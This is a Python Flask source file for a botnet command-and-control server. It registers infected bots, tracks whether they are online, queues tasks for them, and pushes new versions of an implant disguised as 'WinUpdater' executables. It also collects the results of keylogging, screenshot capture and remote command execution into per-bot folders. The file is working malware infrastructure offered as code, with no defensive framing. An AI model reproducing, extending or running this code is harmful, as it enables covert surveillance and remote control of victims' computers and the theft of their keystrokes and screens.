from flask import Flask, request, jsonify
from functools import wraps
import base64
import json
import uuid
from datetime import datetime
from C2Requests import Request
from threading import Thread
from time import sleep
import os

app = Flask(__name__)

# The code bellow is for handling authentication

def validate(auth):
    '''This function validates the username/password provided in the request received.'''
    with open('creds.json', 'r') as credsfile:
        credsObj = json.load(credsfile)

    httpauth = base64.b64decode(auth).decode().split(':')

    for cred in credsObj:
        if httpauth[0] == cred["username"] and httpauth[1] == cred["password"]:
            return True
    return False


def reqAuth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.headers.get('Authorization')
        if auth is None or not validate(auth[6:]):
            return jsonify({"status":"forbidden"}), 403
        return f(*args, **kwargs)
    return decorated


@app.route('/getOverview', methods=['GET'])
@reqAuth
def getOverview():
    '''
    Returns overview information about all bots. Total, online and offline.
    This is for client use.
    '''
    overview = {}
    with open('bots.json', 'r') as botsfile:
        botsObj = json.load(botsfile)
    overview["numBots"] = len(botsObj)
    overview["online"] = [bot for bot in botsObj if bot["online"] == "True"]
    overview["offline"] = [bot for bot in botsObj if bot["online"] == "False"]
    return jsonify(overview), 200


@app.route('/getStatus/<bot_id>', methods=['GET'])
@reqAuth
def getStatus(bot_id):
    '''
    Returns True if a bot performed a check in the last ten minutes. It means that the bot is online.
    This is for client use.
    '''
    with open('bots.json', 'r') as botsfile:
        botsObj = json.load(botsfile)
    botFound = [bot for bot in botsObj if bot["bot_id"] == bot_id]
    if len(botFound) == 0:
        return jsonify({"error":"bot id not found"}), 404
    return jsonify(botFound[0]), 200


@app.route('/newRequest', methods=['POST'])
@reqAuth
def newRequest():
    '''
    Schedule one new task for each bot_id.
    This is for client use.
    '''
    try:
        json_request = request.get_json()
    except:
        return jsonify({"status":"error"}), 400

    newrequest, offline, not_found = c2requests.new(json_request)

    if "error" in newrequest.items():
        return jsonify(newrequest), 200
    else:
        return jsonify({"request_id":newrequest["request_id"], "tasks":newrequest["tasks"], "offline":offline, "not_found":not_found}), 201


@app.route('/checkTask/<task_id>', methods=['GET'])
@reqAuth
def checkTask(task_id):
    '''
    Checks if a given task is done.
    This is for client use.
    '''
    with open('requests.json', 'r') as requestsfile:
        requestsObj = json.load(requestsfile)
    for request in requestsObj:
        for task in request["tasks"]:
            if task_id in task.values():
                return jsonify(task), 200
    return jsonify({"error":"Task id not found"}), 404


@app.route('/checkRequest/<request_id>', methods=['GET'])
@reqAuth
def checkRequest(request_id):
    '''
    Checks if a given task is done.
    This is for client use.
    '''
    with open('requests.json', 'r') as requestsfile:
        requestsObj = json.load(requestsfile)
    for request in requestsObj:
        if request_id in request.values():
            return jsonify(request), 200
    return jsonify({"error":"Request id not found"}), 404


@app.route('/Check', methods=['POST'])
@reqAuth
def Check():
    '''
    Registers a new bot if it\'s not in the database or updates the last known status of an existing bot.
    It checks for new tasks for this particular bot and also checks if there is a new version for the bot
    This is for bot use.
    '''
    try:
        json_request = request.get_json()
        bot_id = json_request["bot_id"]
    except:
        return jsonify({"status":"error"}), 400

    try:
        runningBotVersion = json_request["version"]
    except:
        runningBotVersion = None

    date = str(datetime.now().year)+str(datetime.now().month).zfill(2)+str(datetime.now().day).zfill(2)+str(datetime.now().hour).zfill(2)+str(datetime.now().minute).zfill(2)+str(datetime.now().second).zfill(2)

    with open('bots.json', 'r+') as botsfile:
        botsObjread = json.load(botsfile)

    with open('bots.json', 'w') as botsfile:
        for idx, bot in enumerate(botsObjread):
            if bot["bot_id"] == bot_id:
                botsObjread[idx]["online"] = "True"
                botsObjread[idx]["last_check"] = int(date)
                json.dump(botsObjread, botsfile, indent=4)
                break
        else:
            try:
                botsObjread.append({"bot_id":bot_id,"version":runningBotVersion,"online":"True","last_check": int(date),"hostname":json_request["hostname"], "ip":json_request["ip"]})
                json.dump(botsObjread, botsfile, indent=4)
                path = os.path.join('./data/', bot_id, 'screenshots')
                os.makedirs(path)
                return jsonify({"status":"registered"}), 201
            except Exception:
                return jsonify({"status":"error"}), 400

    if runningBotVersion is not None and currentBotVersion > runningBotVersion:
        print('Detected old version running on %s. Updating...' % bot_id)
        with open('WinUpdater'+str(currentBotVersion)+'.exe', 'rb') as botfile:
            b64bot = base64.b64encode(botfile.read()).decode()

        with open('bots.json', 'r+') as botsfile:
            botsObjread = json.load(botsfile)
        with open('bots.json', 'w') as botsfile:
            for idx, bot in enumerate(botsObjread):
                if bot["bot_id"] == bot_id:
                    botsObjread[idx]["version"] = currentBotVersion
                    json.dump(botsObjread, botsfile, indent=4)
        print('New version sent to %s' % bot_id)
        return jsonify({"status":"new_version", "version":currentBotVersion, "file":b64bot}), 200

    tasks = []

    with open('requests.json', 'r') as requestsfile:
        requestsObj = json.load(requestsfile)
    for idx, rqst in enumerate(requestsObj):
        if bot_id in rqst["targets"] and rqst["status"] == "new":
            tasks.append({"request_id":rqst["request_id"],"request_type":rqst["request_type"],"arguments":rqst["arguments"]})
            requestsObj[idx]["status"] = "not_done"
    if len(tasks) > 0:
        with open('requests.json', 'w') as requestsfile:
            json.dump(requestsObj, requestsfile, indent=4)
        return jsonify({"status":"new","tasks":tasks}), 200
    else:
        return jsonify({"status":"updated"}), 200

@app.route('/sendResult', methods=['POST'])
@reqAuth
def sendResult():
    '''
    Receives the result of a task performed by a bot and stores it. The client can then consult the C2 for the task status and receive the results.
    This is for bot use.
    '''

    try:
        json_request = request.get_json()
    except Exception:
        return jsonify({"status":"error"}), 400

    with open('requests.json','r') as requestsfile:
        requestsObj = json.load(requestsfile)

    for idx_req, rqst in enumerate(requestsObj):
        if rqst["request_id"] == json_request["request_id"]:
            for idx_tsk, task in enumerate(rqst["tasks"]):
                if task["bot_id"] == json_request["bot_id"] and task["status"] == "not_done":
                    requestsObj[idx_req]["tasks"][idx_tsk]["status"] = json_request["status"]
                    if json_request["request_type"] == 'printscreen' and json_request["status"] in {'not_done','done'} and json_request["data"] != '':
                        requestsObj[idx_req]["tasks"][idx_tsk]["data"].extend(list(json_request["data"].keys()))
                        for imgname, imgdata in json_request["data"].items():
                            with open('./data/'+json_request["bot_id"]+'/'+'screenshots'+'/'+imgname, 'wb') as imgfile:
                                imgfile.write(base64.b64decode(imgdata))
                    elif json_request["request_type"] == 'keylog' and json_request["status"] in {'dump','done'} and json_request["data"] != '':
                        requestsObj[idx_req]["tasks"][idx_tsk]["data"] = json_request["data"]
                        with open('./data/'+json_request["bot_id"]+'/keylog.txt','a+') as logfile:
                            logfile.write(base64.b64decode(json_request["data"]).decode() + '\n\n\n')
                    elif json_request["request_type"] == 'cmdexec' and json_request["status"] == 'done' and json_request["data"] != '':
                        requestsObj[idx_req]["tasks"][idx_tsk]["data"] = json_request["data"]
                    else:
                        requestsObj[idx_req]["tasks"][idx_tsk]["data"] = json_request["data"]

            if all(task["status"] in {"done", "error"} for task in rqst["tasks"]):
                rqst["status"] = "done"

    with open('requests.json','w') as requestsfile:
        json.dump(requestsObj, requestsfile, indent=4)

    return jsonify({"status":"OK"}), 200

def onlineCheck():
    print('Initiating periodic online check...')
    while True:
        with open('bots.json','r+') as botsfile:
            botsObj = json.load(botsfile)
        for idx, bot in enumerate(botsObj):
            date = str(datetime.now().year)+str(datetime.now().month).zfill(2)+str(datetime.now().day).zfill(2)+str(datetime.now().hour).zfill(2)+str(datetime.now().minute).zfill(2)+str(datetime.now().second).zfill(2)
            if bot['online'] == 'True' and int(date) - int(bot["last_check"]) > 1000:
                print('Bot id %s didn\'t check in for more than 10 minutes. Going offline...' % bot['bot_id'])
                botsObj[idx]["online"] = "False"
        with open('bots.json', 'w') as botsfile:
            json.dump(botsObj, botsfile, indent=4)
        sleep(600)

if __name__ == '__main__':
    c2requests = Request()
    currentBotVersion = 1.15
    onlineCheckThread = Thread(target=onlineCheck)
    onlineCheckThread.start()
    try:
        app.run(host='0.0.0.0', port=4433, ssl_context=('cert.pem','key.pem'))
    except KeyboardInterrupt:
        exit(0)
